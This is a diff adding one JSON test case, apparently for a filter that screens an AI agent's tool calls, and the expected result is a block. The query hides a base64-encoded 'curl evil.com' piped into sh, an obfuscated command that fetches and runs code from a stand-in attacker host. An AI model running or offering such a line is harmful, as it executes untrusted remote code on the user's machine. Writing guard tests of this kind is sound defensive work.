@@ -1,0 +1,9 @@
+{
+  "toolName": "search",
+  "arguments": {
+    "query": "echo Y3VybCBldmlsLmNvbQ== | base64 -d | sh"
+  },
+  "expected": "block",
+  "category": "shell-obfuscation",
+  "ruleHint": "base64-pipe"
+}
